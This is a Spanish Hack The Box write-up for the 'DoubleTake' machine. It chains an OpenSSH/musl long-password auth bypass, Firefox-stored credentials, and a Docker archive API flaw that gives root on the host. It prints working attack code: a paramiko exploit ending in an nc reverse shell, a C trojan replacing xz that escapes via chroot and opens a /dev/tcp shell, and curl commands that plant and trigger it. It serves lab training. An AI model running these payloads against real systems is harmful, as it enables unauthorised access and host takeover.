---
title: DoubleTake
description: DoubleTake es una máquina linux fácil. Un bypass de autenticación en OpenSSH sobre musl (crypt() devolviendo "*" con contraseñas largas) da acceso a un contenedor Alpine. Un perfil de Firefox guardado filtra credenciales de otro usuario, que a su vez abren un panel web con función de deploy. Esa función expone la API de Docker, vulnerable a una resolución de binarios desde el overlay del contenedor — reemplazar xz y subir un archivo comprimido ejecuta el binario como root del host.
date: 2026-11-12
toc: true
pin: false
image: assets/img/htb-writeup-doubletake/logo.png
categories:
  - Hack The Box
  - Machines
  - Dokcker
  - Linux
  - easy
tags:
  - openssh
  - auth-bypass
  - docker-api
  - escape_conteiner
  - firefox-creds
  - musl
  - cve-2026-123158
  - cve-2026-41567
  - xz
  - compiler-troyan
  - sshole
---
## Recon

```bash

sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.170.165 -oG allports

nmap -p22,80 -Pn -sCV 10.129.170.165 -oN targeted

```

22 (OpenSSH 10.6), 80 | nginx 1.24.0, HTTP Basic Auth, realm "Zentara".

---


## sshole  -  CVE-2026-123158


En Linux, las contraseñas se guardan cifradas en `/etc/shadow`. Cuando una cuenta no debe poder entrar con contraseña, ese campo se marca con un simple `*` — es una señal de "esto no es un hash válido, no dejes pasar a nadie".

musl "la librería que usa Alpine en vez de glibc" tiene una particularidad: si algo sale mal calculando el hash de una contraseña, en vez de devolver un error claro, devuelve literalmente la cadena  `"*"` el mismo texto que usan las cuentas bloqueadas.

Eso abre una grieta: si mandas una contraseña absurdamente larga 300 caracteres, para una cuenta marcada con `*`, el cálculo del hash falla "musl" tiene un límite de longitud,  devuelve `"*"`, y el sistema compara ese `"*"` con el `"*"` guardado en shadow. si coinciden, te deja entrar sin saber ninguna contraseña real.

La cuenta `alpine` en esta máquina tiene el `*` en el shadow y no tiene restricciones de login, así que es el objetivo para este ataque.

En la práctica, el intento falla la primera vez y funciona la segunda, por cómo el sistema guarda internamente los datos entre intentos, por eso el script prueba varias veces en la misma conexión.


```python

#!/usr/bin/env python3
import paramiko
import sys
import time

host = sys.argv[1]
lhost = sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001

pw = "A" * 300
t = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
       t.auth_password("alpine", pw)
       print(f"[+] attempt {i}: authenticated")
       break
    except paramiko.AuthenticationException:
       print(f"[-] attempt {i}: denied")

if not t.is_authenticated():
    print("[-] failed")
    sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
time.sleep(1)
t.close()
print("[+] sent")

```


```bash

python3 exploit.py 10.129.170.165 10.10.14.146 9004

```


dos intentos en la misma conexión: el primero sobreescribe el buffer de comparación, y el segundo usa la sal cacheada.


```bash

nc -lvnp 9004

```


shell como `alpine`, dentro de un contenedor (`/.dockerenv` presente).


---

## Enum en el contenedor

```bash

~ $ id
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)

~ $ ls /home
alpine bob

~ $ ls -la /home/bob
-rw-r-----    1 root     bob             33 Nov 12 20:14 user.txt

```


+ `user.txt` pertenece a `bob`, y no tenemos permisos, de lectura ni escritura como `alpine`.
+ pero buscando aparece algo interesante


```bash

~ $ find ~ -name logins.json
/home/alpine/.mozilla/firefox/zentara.default/logins.json


~ $ cat /home/alpine/.mozilla/firefox/zentara.default/logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara", ... "encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==", ...}]}

```


+ `172.17.0.1` es el gateway del bridge de Docker, que apunta al host. y deja unas creds, "cifradas" en base64.


```bash

echo Ym9i | base64 -d                                   # bob
echo Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ== | base64 -d   # CorrectHorseBatteryStaple

```


---


## access - bob

```bash

ssh bob@10.129.170.165

```


```bash

7f906e0ee8ec:/$ cat home/bob/user.txt

# 3780b3b4b9821d962d9a0937532b1715

```


`ip a` confirma `172.17.0.2/16` en `eth0` — dentro del contenedor.


---

## Webapp Zentara


`http://10.129.170.165` pide Basic Auth. las mismas creds de `bob` funcionan.

el panel izquierdo inferior contiene los siguientes sub directorios:

+ Chat,
+ Agents, 
+ Files, 
+ Deploy, 
+ Usage, 
+ Status, 
+ API Docs,
+ Settings. 


en  **Deploy** aceptan cargar docs: `.tar`, `.tar.gz`, `.tar.xz`, con el path de destino configurable `/workspace` por defecto. y el Historial de deploys previos con archivos tipo `api-service-vX.tar.gz`.

---

## CVE-2026-41567 - Docker archive API

Docker hasta la 29.5.0 resuelve el binario de descompresión `xz`, `unpigz` por nombre desde el overlay del contenedor en vez del host, en `PUT /containers/{id}/archive`. El binario resuelto corre como el proceso del daemon: root del host con `CAP_SYS_ADMIN`. El endpoint `/deploy` de la webapp lo reenvía ahí.


#### construccion del Trojano

```c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/10.10.14.146/9000 0>&1", NULL);
    return 1;
}

```


+ lo compilamos con:


```bash

gcc -static -o xz xz.c

```

+ `mount` + `chroot("/proc/1/root")` usa el PID namespace del host, heredado vía `CAP_SYS_ADMIN` para escapar al filesystem real.


### Empaquetado y plant

+ primero se crean todas la ruta de carpetas,

+ despues copiamos el binario compilado dentro de esa estructura,

+ el tar se arma con rutas relativas `usr/bin/xz` en vez de absolutas, para que al extraerse en el contenedor caiga exactamente en `/usr/bin/xz` sin arrastrar la ruta local de la máquina atacante.

+ y nos de volvemos al directorio de trabajo normal.

```bash

mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz
cd ..

```


+ lanzamos

```bash

curl -u bob:CorrectHorseBatteryStaple -F 'archive=@plant.tar' -F 'workspace=/' http://10.129.170.165/deploy

```

+ resultado: 

```json

{"deployment":{"created_at":1794522611,"filename":"plant.tar","id":"dep-9a2a66","size":860160,"status":"success","workspace":"/"},"status":"success"}

```


+ el `workspace=/` extrae en la raíz del contenedor, sobrescribiendo el `/usr/bin/xz` real.


#### Trigger

una ves empaquetada la informacion creamos el trigger:

```bash

echo x > t && tar cf - t | xz > trigger.tar.xz

```


+ antes de lanzar es ponerse en escucha por cualquier puerto disponible:

```bash

nc -lvnp xxxx

```


+ y se lanza el trigger

```bash

curl -u bob:CorrectHorseBatteryStaple -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace' http://10.129.170.165/deploy

```


El daemon detecta la compresión xz en el stream entrante, resuelve a `/usr/bin/xz` desde el overlay del contenedor "trojanizado", y lo ejecuta como host root. y devuelve el error 

+ 500 sever error es el timeout del comando, nos deberia dar la reverse shell.

```bash

root@doubletake:/# id
uid=0(root) gid=0(root) groups=0(root)

root@doubletake:/# cat root.txt
1fa606019877d80b87985db4ad950bb9

```
